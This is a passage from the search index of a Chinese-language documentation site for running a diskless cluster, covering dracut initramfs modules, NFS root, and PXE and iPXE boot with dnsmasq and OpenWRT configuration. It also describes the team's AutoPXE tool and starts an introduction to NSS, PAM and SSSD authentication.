\u4e8b\u4ef6\u800c\u4e0d\u662f\u786c\u7f16\u7801\u7684\u811a\u672c\u6765\u6267\u884c\u4efb\u52a1\u3002\u8fd9\u4f7f\u5f97 dracut-ng \u66f4\u52a0\u7075\u6d3b\uff0c\u53ef\u4ee5\u9002\u5e94\u5404\u79cd\u786c\u4ef6\u73af\u5883\u3002</p> <p>dracut \u80fd\u591f\u9009\u62e9\u5411 initramfs \u4e2d\u6dfb\u52a0/\u5220\u9664 module \u4ee5\u5b9e\u73b0\u4e0d\u540c\u7684\u529f\u80fd\u3002module \u6dfb\u52a0\u540e\u4e0d\u4e00\u5b9a\u5c31\u4f1a\u88ab\u6267\u884c\uff0c\u53ef\u4ee5\u901a\u8fc7\u5185\u6838\u542f\u52a8\u53c2\u6570\u6765\u63a7\u5236\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u901a\u8fc7\u5185\u6838\u542f\u52a8\u53c2\u6570\u66f4\u6539\u6839\u6587\u4ef6\u7cfb\u7edf\u7b49\uff0c\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u751f\u6210 initramfs\u3002</p> <p>\u5982\u542f\u52a8\u8fc7\u7a0b\u4e2d\u6240\u8ff0\uff0c\u5f15\u5bfc\u7a0b\u5e8f\u4f1a\u52a0\u8f7d initramfs \u5230\u5185\u5b58\u4e2d\u4f5c\u4e3a\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u542f\u52a8\u5176\u4e2d\u7684 <code>/sbin/init</code> \u8fdb\u884c\u521d\u59cb\u5316\uff0c\u518d\u5207\u6362\u5230\u771f\u6b63\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\u3002</p> <p><code>dracut</code> \u9ed8\u8ba4\u4f7f\u7528\u5f53\u524d\u6d3b\u8dc3\u7684\u5185\u6838\u3002\u5982\u679c\u6309\u4e0a\u6587 chroot \u65b9\u5f0f\u542f\u52a8\uff0c\u5219\u53ef\u80fd\u6d3b\u8dc3\u7684\u5185\u6838\u4e0e\u5b89\u88c5\u7684\u5185\u6838\u4e0d\u4e00\u81f4\uff0c\u51fa\u73b0 <code>dracut: Cannot find module directory</code> \u9519\u8bef\u3002\u6b64\u65f6\u5e94\u5f53\u4f7f\u7528 <code>--kver</code> \u53c2\u6570\u6307\u5b9a\u5185\u6838\u7248\u672c\u3002</p> <pre><code>apt install network-manager\n# dracut-network \u6a21\u5757\u4f9d\u8d56\u4e8e network-manager\n# \u82e5\u6ca1\u6709\u5b89\u88c5\uff0c\u5219\u53ef\u80fd\u51fa\u73b0 dracut: dracut module 'nfs' depends on 'network', which can't be installed \u7b49\u9519\u8bef\n# \u5bfc\u81f4 dpkg \u6301\u7eed\u5931\u8d25\n# \u53c2\u8003 https://github.com/dracutdevs/dracut/issues/1756\napt install dracut dracut-network\nKERNEL_VERSION='6.1.0-21-amd64'\ndracut --list-modules --kver $KERNEL_VERSION\n</code></pre> <p>\u53ef\u4ee5\u9009\u62e9\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u9700\u8981\u7684\u6a21\u5757\uff1a</p> /etc/dracut.conf.d<pre><code># rootovl.conf\nfilesystems+=\" overlay \"\n# 11-ifcfg.conf\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\nadd_dracutmodules+=\" ifcfg \"\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u4e2d\u6307\u5b9a/\u6dfb\u52a0\uff1a</p> <pre><code># \u4ec5\u6307\u5b9a\ndracut -m \"nfs network base overlayfs\" --kver $KERNEL_VERSION --force\n# \u9ed8\u8ba4+\u6dfb\u52a0\ndracut --add overlayfs --kver $KERNEL_VERSION --force\n</code></pre> <p>\u5173\u4e8e <code>dracut</code> \u7684\u5185\u6838\u53c2\u6570\uff0c\u53ef\u4ee5\u67e5\u770b <code>man dracut.cmdline</code>\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u5206\u4eab\u6839\u6587\u4ef6\u7cfb\u7edfnfs","title":"\u5206\u4eab\u6839\u6587\u4ef6\u7cfb\u7edf\uff1aNFS","text":"<p>\u5b8c\u6210\u6839\u6587\u4ef6\u7cfb\u7edf\u7684\u521b\u5efa\u540e\uff0c\u5e94\u5f53\u914d\u7f6e NFS \u670d\u52a1\uff0c\u4ee5\u4fbf\u5176\u4ed6\u8282\u70b9\u53ef\u4ee5\u6302\u8f7d\u8be5\u6587\u4ef6\u7cfb\u7edf\u3002\u89c1 \u78c1\u76d8\u548c\u6587\u4ef6\u7cfb\u7edf#NFS\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/","title":"\u5f15\u5bfc\u65b9\u5f0f\uff1aPXE","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#\u5f15\u5bfc\u65b9\u5f0fpxe","title":"\u5f15\u5bfc\u65b9\u5f0f\uff1aPXE","text":"<p>Preboot eXecution Environment</p> <p>Abstract</p> <p>\u672c\u6587\u8bb2\u89e3\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>PXE \u5982\u4f55\u4ece UEFI \u4e2d\u542f\u52a8\uff0c\u52a0\u8f7d NBP \u8fdb\u5165\u5f15\u5bfc\u8fc7\u7a0b</li> <li>\u5982\u4f55\u914d\u7f6e DHCP \u670d\u52a1\u5668\u7b49 PXE \u73af\u5883</li> <li>\u4ecb\u7ecd\u6211\u4eec\u57fa\u4e8e iPXE \u6784\u5efa\u7684 AutoPXE \u9879\u76ee\u3002</li> </ul> <p>Quote</p> <ul> <li>GitHub: PXE</li> <li>Preboot eXecution Environment (PXE) Specification Version 2.1</li> <li>RFC4578: Dynamic Host Configuration Protocol (DHCP) Options for the Intel Preboot eXecution Environment (PXE)</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#pxe-\u539f\u7406","title":"PXE \u539f\u7406","text":"<p>\u7b80\u5355\u6765\u8bf4\uff0cPXE \u6807\u51c6\u89c4\u5b9a\u4e86\u7f51\u7edc\u542f\u52a8\u7684\u4e00\u7cfb\u5217\u534f\u8bae\u548c\u6d41\u7a0b\uff0c\u786e\u4fdd\u5ba2\u6237\u7aef\u80fd\u591f\u4ece\u7f51\u7edc\u542f\u52a8\u5e76\u83b7\u53d6\u5230\u6b63\u786e\u7684\u8f6f\u4ef6\u955c\u50cf\u548c\u914d\u7f6e\u53c2\u6570\u3002</p> <ul> <li>\u5ba2\u6237\u7aef\u9700\u8981\u652f\u6301 PXE\uff0c\u5927\u4f53\u4e0a\u6709\u786c\u4ef6\u4e2d\u7684\u56fa\u4ef6\u548c\u542f\u52a8\u955c\u50cf\u4e24\u79cd\u65b9\u5f0f\uff1a<ul> <li>\u73b0\u4ee3\u7f51\u5361\u4e0a\u90fd\u6709 PXE \u56fa\u4ef6\uff0c\u6bd4\u5982\uff1aIntel \u7f51\u5361\u7684 Intel Boot Agent\u3001PVE \u865a\u62df\u673a\u4e2d\u7684 iPXE\u3001InfiniBand \u7684 FlexBoot \u7b49\u3002</li> <li>iPXE\u3001pxelinux \u7b49\u90fd\u63d0\u4f9b\u4e86 PXE \u542f\u52a8\u955c\u50cf\u3002\u53ef\u4ee5\u5728\u672c\u5730\u4ece\u5e38\u89c4 BIOS \u6216 UEFI \u542f\u52a8\u5230\u8fd9\u4e9b\u955c\u50cf\uff0c\u7136\u540e\u518d\u542f\u52a8 PXE \u73af\u5883\u3002</li> </ul> </li> <li>\u7f51\u7edc\u4e2d\u9700\u8981\u6709 DHCP \u670d\u52a1\u5668\u548c TFTP \u670d\u52a1\u5668\uff0c\u5206\u522b\u63d0\u4f9b IP \u5730\u5740\u548c\u542f\u52a8\u955c\u50cf\u3002DHCP \u670d\u52a1\u5668\u9700\u8981\u652f\u6301 PXE \u6269\u5c55\uff0c\u6bd4\u5982\u63d0\u4f9b PXEClient \u548c client-arch \u4e24\u4e2a\u5b57\u6bb5\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#option-rom","title":"Option ROM","text":"<p>Quote</p> <ul> <li>Preboot eXecution Environment (PXE) Specification Version 2.1 \u7b2c\u56db\u7ae0</li> <li>UEFI \u5f00\u53d1\u63a2\u7d22 36 \u2013 UEFI Option ROM</li> <li>UEFI PXE Boot Performance Analysis - Intel</li> </ul> <p>\u5982\u679c\u5728 BIOS \u4e2d\u5173\u95ed\u7f51\u5361\u7684 Option ROM\uff0c\u4f60\u4f1a\u53d1\u73b0 PXE \u4ece\u542f\u52a8\u5217\u8868\u4e2d\u6d88\u5931\u3002PXE Spec \u7b2c\u56db\u7ae0\u4ecb\u7ecd\u4e86 Option ROM \u548c Initial Program Load\uff08IPL\uff09\u7684\u6982\u5ff5\u548c\u5386\u53f2\uff1a</p> <ul> <li>Option ROM\uff1a<ul> <li>\u6211\u4eec\u77e5\u9053 BIOS \u5b58\u50a8\u5728\u4e3b\u677f\u7684 ROM \u4e2d\uff0cPCIe \u7b49\u5916\u56f4\u8bbe\u5907\u4e5f\u6709\u81ea\u5df1\u7684 ROM\uff0c\u79f0\u4e3a Option ROM\u3002\u4f7f\u7528 Option ROM\uff0c\u5382\u5546\u53ef\u4ee5\u6269\u5c55 BIOS \u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6dfb\u52a0\u65b0\u8bbe\u5907\u652f\u6301\u3001\u63d0\u4f9b\u65b0\u7684\u542f\u52a8\u65b9\u5f0f\u7b49\u3002</li> <li>BIOS \u5728 POST \u671f\u95f4\u626b\u63cf\u7cfb\u7edf\u6269\u5c55\u603b\u7ebf\u4e0a\u7684 Option ROM\uff0c\u5c06\u5176\u590d\u5236\u5230 Shadow RAM \u4e2d\uff0c\u7136\u540e\u6267\u884c\u521d\u59cb\u5316\u4ee3\u7801\u3002</li> </ul> </li> <li>IPL\uff08Initial Program Load\uff09\uff1a<ul> <li>IPL \u662f BIOS \u542f\u52a8\u8fc7\u7a0b\u4e2d\u7684\u8bbe\u5907\u52a0\u8f7d\u673a\u5236\u3002</li> <li>IPL \u8868\uff08IPL Table\uff09\u4f1a\u5217\u51fa\u6240\u6709\u53ef\u80fd\u7684\u542f\u52a8\u8bbe\u5907\uff0c\u4f18\u5148\u7ea7\u7531\u7528\u6237\u5728 BIOS \u8bbe\u7f6e\u4e2d\u5b9a\u4e49\u3002</li> <li>Option ROM \u626b\u63cf\u8fc7\u7a0b\u4e2d\u8bc6\u522b\u7684\u8bbe\u5907\u53ef\u4ee5\u6269\u5c55 IPL \u8868\uff0c\u6dfb\u52a0\u7279\u6b8a\u7684\u542f\u52a8\u529f\u80fd\uff08\u4f8b\u5982 PXE \u7f51\u7edc\u542f\u52a8\uff09\u3002</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#pxe-\u542f\u52a8\u8fc7\u7a0b","title":"PXE \u542f\u52a8\u8fc7\u7a0b","text":"<p>PXE \u7684\u6d41\u7a0b\u5927\u81f4\u5982\u4e0b\uff1a</p> PXE \u6d41\u7a0b\u603b\u89c8  Overview of PXE Boot Installation Process - VMware Docs <ul> <li>PXE \u5ba2\u6237\u7aef\u53d1\u9001 DHCP Discover \u8bf7\u6c42\uff0c\u4ece DHCP Offer \u4e2d\u83b7\u5f97 TFTP \u670d\u52a1\u5668\u7684\u5730\u5740\u548c\u6587\u4ef6\u540d\u3002</li> <li>PXE \u5ba2\u6237\u7aef\u4ece TFTP \u670d\u52a1\u5668\u52a0\u8f7d\u5bf9\u5e94\u7684 boot loader\uff08\u5728 PXE \u8fd9\u8fb9\u79f0\u4e3a\u7f51\u7edc\u542f\u52a8\u7a0b\u5e8f NBP\uff0cNetwork Boot Program\uff09\u3002\u6211\u4eec\u4f7f\u7528\u7684 boot loader \u662f iPXE\u3002</li> <li>boot loader \u4f7f\u7528 TFTP \u6216 HTTP \u7b49\u65b9\u5f0f\u62ff\u53d6\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7b49\u6587\u4ef6\uff0c\u7136\u540e\u542f\u52a8\u64cd\u4f5c\u7cfb\u7edf\u3002</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u53ef\u80fd\u53c8\u4f1a\u8bf7\u6c42\u4e00\u6b21 DHCP\uff0c\u4ee5\u83b7\u53d6 IP \u5730\u5740\u548c\u5176\u4ed6\u914d\u7f6e\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#\u914d\u7f6e-dhcp-\u670d\u52a1\u5668","title":"\u914d\u7f6e DHCP \u670d\u52a1\u5668","text":"<p>Quote</p> <ul> <li>https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml</li> <li>https://support.huawei.com/enterprise/en/doc/EDOC1100213116/766bc0e9/example-for-configuring-a-dhcp-server-to-assign-pxe-startup-parameters-to-a-client</li> <li>https://github.com/WillChamness/Dnsmasq-PXE</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#\u5b9e\u9a8c","title":"\u5b9e\u9a8c","text":"<p>Legacy \u548c UEFI \u542f\u52a8\u9700\u8981\u4e0d\u540c\u7684 pxelinux \u6587\u4ef6\uff0c\u56e0\u6b64\u9700\u8981\u6839\u636e DHCP Discover \u4e2d\u7684\u5b57\u6bb5\u8bc6\u522b\u5ba2\u6237\u7aef\u662f\u54ea\u79cd\u542f\u52a8\u65b9\u5f0f\u3002</p> <p>\u8ba9\u6211\u4eec\u6293\u5305\u5206\u6790\u4e00\u4e0b\u4e0d\u540c\u6a21\u5f0f\u542f\u52a8\u65f6 PXE \u53d1\u9001\u7684 DHCP Discover \u9644\u5e26\u7684\u5b57\u6bb5\uff1a</p> <p></p> PXE \u8bbe\u5907 DHCP 60 Vendor Specific (ascii) DHCP 93 client-arch (number) PVE \u4e0a\u7684 iPXE Legacy PXEClient 00 00 PVE \u4e0a\u7684 UEFI PXE PXEClient:Arch:00007:UNDI:003001 00 07 Intel \u7f51\u5361\u4e0a\u7684 Boot Agent <p>RFC 4578 \u5bf9 DHCP Option 93 \u7684\u5b9a\u4e49\u6709\u9519\uff0c\u8bf7\u67e5\u770b StackExchange: What is the PXE Client System Architecture Type \"BC EFI (7)\" from RFC 4578?</p> <p>There\u2019s a conflict between the architecture types defined in RFC4578 DHCP PXE Options and the IANA registered Processor Architecture Types: the latter notes that x64 UEFI is type 00:07 which seems to be the value used in practice (ref. syslinux).</p> <p>There's an Errata ID 4624 filed on the RFC. It states that 7 should be EFI x86-64 and 9 should be EFI BC.</p> <p>Therefore, the IANA registry (which is more extensive and should be the authoritative source for this information post RFC publication as it is maintained and updated where the RFC is not) is correct and the original RFC is wrong.</p> <p>\u867d\u7136 Intel \u7684 PXE \u89c4\u8303\u4e2d\u63cf\u8ff0 DHCP Option 60 \u5e94\u5f53\u4e3a <code>PXEClient:Arch:xxxxx:UNDI:yyyzzz</code> \u7684\u683c\u5f0f\uff0c\u4f46\u6211\u4eec\u770b\u5230 iPXE \u6ca1\u6709\u9075\u5b88\uff0c\u6545\u4e0d\u80fd\u4f9d\u8d56 Option 60 \u6765\u533a\u5206\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0 Option 93 <code>client-arch</code> \u5b57\u6bb5\u66f4\u52a0\u53ef\u9760\uff0c\u56e0\u6b64\u9009\u7528\u5b83\u6765\u533a\u5206 Legacy \u548c UEFI \u542f\u52a8\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#openwrt-\u4e0a\u7684-dnsmasq","title":"OpenWRT \u4e0a\u7684 dnsmasq","text":"<p>Quote</p> <ul> <li>OpenWRT Wiki: DHCP and DNS examples</li> <li>OpenWRT Forum: Configuring DHCP server options selectively based on vendor class?</li> </ul> <p>\u4e0d\u540c DHCP \u670d\u52a1\u5668\u914d\u7f6e\u65b9\u5f0f\u4e0d\u540c\uff0c\u73b0\u5728\u6211\u4eec\u4f7f\u7528\u7684\u662f OpenWRT \u4e0a\u7684 dnsmasq\uff0c\u5b83\u4f7f\u7528 OpenWRT UCI \u914d\u7f6e\u6587\u4ef6 <code>/etc/config/dhcp</code>\u00a0\uff0c\u548c\u4e00\u822c Linux \u53d1\u884c\u7248\u4e0a\u7684 <code>dnsmasq.conf</code> \u8bed\u6cd5\u4e0d\u4e00\u6837\u3002\u4e0b\u9762\u662f\u5339\u914d\u89c4\u5219\u5728 <code>dnsmasq.conf</code>\u00a0\u548c OpenWRT UCI \u7684\u5bf9\u6bd4\uff1a</p> <p>\u4ec0\u4e48\u662f networkid</p> <p>dnsmasq offers to group DHCP options and their values by a tag, internally named <code>networkid</code>, which is an alphanumeric identifier, and sending options only to hosts which have been tagged with that <code>networkid</code>.</p> dnsmasq.conf \u683c\u5f0f<pre><code># \u8fd9\u8fb9\u6ca1\u6709 serveraddress \u662f\u56e0\u4e3a\u8fd9\u4e2a\u793a\u4f8b\u6587\u4ef6\u7684 tftp \u548c dhcp \u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u9ed8\u8ba4\u53d1\u9001\u672c\u673a\ndhcp-match=set:efi64,option:client-arch,7\ndhcp-boot=tag:efi64,efi64/syslinux.efi\n</code></pre> OpenWRT UCI \u683c\u5f0f<pre><code>config match`\n        option networkid 'efi64'\n        option match '93,0007'\nconfig boot\n        option networkid 'efi64'\n        option filename 'efi64/syslinux.efi'\n        option servername 'Root'\n        option serveraddress '172.25.2.10'\n</code></pre> <p>\u5b83\u4eec\u63cf\u8ff0\u7684\u662f\u540c\u4e00\u4ef6\u4e8b\u60c5\uff1a</p> <ol> <li>\u5982\u679c\u9047\u5230 DHCP Discover \u4e2d\u7684 client-arch\uff0893\uff09\u4e3a 7\uff0c\u90a3\u4e48\u6253\u4e0a <code>efi64</code>\u00a0\u7684 tag\uff08\u8bbe\u7f6e networkid \u4e3a efi64\uff09\u3002</li> <li>\u4e3a\u5e26\u6709 <code>efi64</code>\u00a0tag\uff08\u5c5e\u4e8e efi64 \u8fd9\u4e2a networkid\uff09\u7684\u5ba2\u6237\u7aef\u53d1\u9001\u6307\u5b9a\u7684 boot \u4fe1\u606f\uff08\u5c31\u662f saddr\u3001sname \u548c filename\uff09\u3002</li> </ol> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5728 OpenWRT \u4e0a\u914d\u7f6e\u5982\u4e0b\uff1a</p> /etc/config/dhcp<pre><code>config match\n        option networkid 'bios'\n        option match '93,0000'\n\nconfig boot\n        option networkid 'bios'\n        option filename 'bios/pxelinux.0'\n        option serveraddress '172.25.2.10'\n        option servername 'Root'\n\nconfig match\n        option networkid 'efi64'\n        option match '93,0007'\n\nconfig boot\n        option networkid 'efi64'\n        option filename 'efi64/syslinux.efi'\n        option servername 'Root'\n        option serveraddress '172.25.2.10'\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#ipxe","title":"iPXE","text":"<p>\u66fe\u7ecf\u6211\u4eec\u4f7f\u7528 pxelinux \u4f5c\u4e3a\u7f51\u7edc\u542f\u52a8\u7a0b\u5e8f\uff0c\u4f46\u5b83\u592a\u8fc7\u8001\u65e7\uff0c\u4e14 UEFI \u542f\u52a8\u65f6\u6709\u4f20\u8f93\u901f\u5ea6\u6307\u6570\u7ea7\u4e0b\u964d\u7684\u95ee\u9898\u3002\u56e0\u6b64\u6211\u4eec\u8f6c\u5411\u4e86 iPXE\u3002</p> <p>iPXE \u8bed\u6cd5\u89c1 scripting - iPXE\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#autopxe","title":"AutoPXE","text":"<p>\u57fa\u4e8e iPXE Script\uff0c\u6211\u4eec\u6784\u5efa\u4e86  mrhaoxx/AutoPXE\u7528\u4e8e\u81ea\u52a8\u4e3a\u5404\u4e2a\u670d\u52a1\u5668\u63d0\u4f9b\u542f\u52a8\u914d\u7f6e\u3002AutoPXE \u80fd\u591f\uff1a</p> <ul> <li>\u81ea\u52a8\u5728 <code>/pxe/rootfs</code> \u4e0b\u5bfb\u627e\u6784\u5efa\u597d\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u8bc6\u522b\u53d1\u884c\u7248\u548c\u5185\u6838\u7248\u672c\u7b49\u3002</li> <li>\u4e3a\u6307\u5b9a\u7684 MAC \u5730\u5740\u63d0\u4f9b\u5bf9\u5e94\u7684\u542f\u52a8\u914d\u7f6e\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#autopxe-\u5b9e\u73b0","title":"AutoPXE \u5b9e\u73b0","text":"<ul> <li> <p>\u5229\u7528 Embedded script\uff0c\u6211\u4eec\u5728\u6784\u5efa iPXE \u65f6\u52a0\u5165\u4e0b\u9762\u7684\u811a\u672c\uff0c\u8ba9\u5ba2\u6237\u7aef\u6839\u636e MAC \u5730\u5740\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\uff1a</p> embed.ipxe<pre><code>#!ipxe\n\nprompt --key 0x02 --timeout 3000 Press Ctrl-B for the iPXE command line... &amp;&amp; shell ||\n\ndhcp\nchain autopxe-${mac:hexraw}\n</code></pre> </li> <li> <p>\u670d\u52a1\u7aef\u6839\u636e\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6587\u4ef6\u540d\uff0c\u81ea\u52a8\u5373\u65f6\u751f\u6210\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\uff1a</p> pxe/auto.go<pre><code>func (s *Server) Handle(ctx *tftp.Ctx) tftp.Ret {\n    if strings.HasPrefix(ctx.Path, \"autopxe-\") {\n        script := ipxe.IPXEScript{}\n        script.Append(\"#!ipxe\\n\")\n\n        oss := ScanRootfs(s.RootfsPath)\n        menu := ipxe.Menu{\n            Title:   \"AutoPXE Boot Main Menu \" + ctx.MacAddress + \" \" + ctx.IP + \" ${hostname}\",\n            Id:      \"start\",\n            Timeout: \"10000\",\n        }\n    script.Append(`:shell\n\necho Type 'exit' to get the back to the menu\nshell\ngoto start\n...\n`)\n</code></pre> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/pxe/#autopxe-\u4f7f\u7528","title":"AutoPXE \u4f7f\u7528","text":"<p>AutoPXE \u6253\u5305\u4e3a Docker \u955c\u50cf\uff0c\u6709\u4e24\u4e2a\u76ee\u5f55\u9700\u8981\u6302\u8f7d\u5230\u5bf9\u5e94\u4f4d\u7f6e\uff1a</p> <ul> <li>\u6839\u6587\u4ef6\u7cfb\u7edf</li> <li>\u914d\u7f6e\u6587\u4ef6 <code>/config.yaml</code></li> </ul> <p>AutoPXE \u4f7f\u7528\u4e0b\u9762\u7684\u683c\u5f0f\u6807\u8bc6\u6bcf\u4e2a\u53d1\u884c\u7248\u548c\u914d\u7f6e\u7ec4\u5408\uff1a</p> <pre><code>&lt;\u53d1\u884c\u7248&gt;/&lt;\u7248\u672c&gt;/&lt;\u5185\u6838\u7248\u672c&gt;/&lt;\u542f\u52a8\u9009\u9879&gt;\n</code></pre> <p>\u6bd4\u5982 <code>debian/stable/latest/overlayfs</code> \u8868\u793a\uff1aDebian \u7684 stable \u7248\u672c\uff0c\u6700\u65b0\u7684\u5185\u6838\u7248\u672c\uff0c\u4f7f\u7528 overlayfs \u542f\u52a8\u3002</p> <p>\u914d\u7f6e\u6587\u4ef6 <code>config.yaml</code> \u7b80\u5355\u793a\u4f8b\u5982\u4e0b\uff1a</p> config.yaml<pre><code>version: 1\n\nDefaultDistro: debian/stable/latest/overlayfs\n\nRootfsPath: /pxe/rootfs/\n\nEnv:\n  nfs-server: 172.25.2.11\n\n\nCmdlineTemplates:\n  overlayfs: root=/dev/nfs nfsroot=${nfs-server}:${rootfs-path} ip=dhcp rootovl\n  nfsrw: root=/dev/nfs nfsroot=${nfs-server}:${rootfs-path} ip=dhcp rw\n\nHostDefaults:\n  bc2411b01ade: debian/bookworm/latest/overlayfs\n</code></pre> <ul> <li><code>DefaultDistro</code>\uff1a\u9ed8\u8ba4\u542f\u52a8\u7684\u53d1\u884c\u7248\u548c\u914d\u7f6e\u7ec4\u5408\u3002</li> <li><code>RootfsPath</code>\uff1a\u6839\u6587\u4ef6\u7cfb\u7edf\u7684\u8def\u5f84\u3002</li> <li><code>Env</code>\uff1a<code>ipxe</code> \u4e2d\u7684\u53d8\u91cf\uff0c\u76ee\u524d\u53ea\u6709 <code>nfs-server</code>\u3002</li> <li><code>CmdlineTemplates</code>\uff1a\u5185\u6838\u542f\u52a8\u9009\u9879\u6a21\u677f\u3002</li> <li><code>HostDefaults</code>\uff1a\u9ed8\u8ba4\u7684 MAC \u5730\u5740\u548c\u914d\u7f6e\u7ec4\u5408\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/auth/","title":"\u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743\uff1aNSS\u3001PAM \u548c SSSD","text":"","tags":["help"]},{"location":"operation/system/service/auth/#\u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743nsspam-\u548c-sssd","title":"\u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743\uff1aNSS\u3001PAM \u548c SSSD","text":"<p>Todo</p> <ul> <li> \u8865\u5145 PAM\u3001NSS \u7684\u4ecb\u7ecd\u3002</li> </ul>","tags":["help"]},{"location":"operation/system/service/auth/#linux-\u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743\u539f\u7406","title":"Linux \u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743\u539f\u7406","text":"<p>Quote</p> <ul> <li>How PAM NSS SSD work together on Linux OS - Cloudera Community9</li> <li>ldap - Understand PAM and NSS - Server Fault</li> </ul> <p>\u9996\u5148\u6211\u4eec\u8981\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002\u5982\u679c\u4e0d\u719f\u6089\u8fd9\u4e9b\u6982\u5ff5\uff0c\u5728\u9605\u8bfb\u6587\u6863\u65f6\u53ef\u80fd\u4f1a\u611f\u5230\u56f0\u60d1\u3002</p> <ul> <li>\u8ba4\u8bc1\uff08Authentication\uff09\uff1a\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002\u901a\u5e38\u662f\u901a\u8fc7\u7528\u6237\u540d\u548c\u5bc6\u7801\u6765\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002</li> <li>\u6388\u6743\uff08Authorization\uff09\uff1a\u786e\u5b9a\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u67d0\u4e2a\u8d44\u6e90\u3002\u901a\u5e38\u662f\u901a\u8fc7\u7528\u6237\u7ec4\u3001\u89d2\u8272\u7b49\u6765\u786e\u5b9a\u7528\u6237\u7684\u6743\u9650\u3002</li> </ul> <p>\u96c6\u7fa4\u76ee\u524d\u4f7f\u7528 LDAP \u6570\u636e\u5e93\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u3002LDAP \u4f5c\u4e3a\u6570\u636e\u5e93\uff0c\u672c\u8eab\u5e76\u4e0d\u63d0\u4f9b\u8ba4\u8bc1\u548c\u6388\u6743\u670d\u52a1\u3002\u4e3a\u4e86\u5b9e\u73b0\u8ba4\u8bc1\u548c\u6388\u6743\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u5de5\u5177\u548c\u670d\u52a1\uff1a</p> <ul> <li>NSS\uff08Name Service Switch\uff0c\u540d\u79f0\u89e3\u6790\u670d\u52a1\uff09\uff1a\u7ba1\u7406\u7cfb\u7edf\u53bb\u54ea\u91cc\u67e5\u627e\u7528\u6237\u4fe1\u606f\uff0c\u6bd4\u5982\u662f\u5728\u672c\u5730\u67e5\u627e\u8fd8\u662f\u5728 LDAP \u67e5\u627e\u3002</li> <li>PAM\uff08Pluggable Authentication Modules\uff0c\u53ef\u63d2\u62d4\u8ba4\u8bc1\u6a21\u5757\uff09\uff1a\u7ba1\u7406\u7cfb\u7edf\u5982\u4f55\u8ba4\u8bc1\u7528\u6237\u3002PAM \u5728\u767b\u5f55\u3001SSH\u3001FTP\u3001<code>su</code> \u7b49\u670d\u52a1\u7684\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u8d77\u4f5c\u7528\u3002</li> </ul> <p>\u5f53\u7136\uff0c\u4e0a\u9762\u4e24\u4e2a\u6a21\u5757\u53ef\u4ee5\u76f4\u63a5\u4e0e LDAP \u901a\u4fe1\uff08\u4f7f\u7528 <code>pam_ldap</code> \u548c <code>nss_ldap</code>\uff09\uff0c\u4f46\u4e8b\u60c5\u53d8\u5f97\u8d8a\u6765\u8d8a\u590d\u6742\u3002\u4e8e\u662f\u4ea7\u751f\u4e86\u4e00\u4e2a\u65b0\u7684\u6a21\u5757\uff0c\u4f5c\u4e3a NSS \u548c PAM \u7684\u540e\u7aef\uff1a</p> <ul> <li>SSSD\uff08System Security Services Daemon\uff0c\u7cfb\u7edf\u5b89\u5168\u670d\u52a1\u5b88\u62a4\u7a0b\u5e8f\uff09\uff1a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u63a5\u53e3\uff0c\u7528\u4e8e\u8fde\u63a5\u5230\u4e0d\u540c\u7684\u8eab\u4efd\u6e90\uff08\u6bd4\u5982 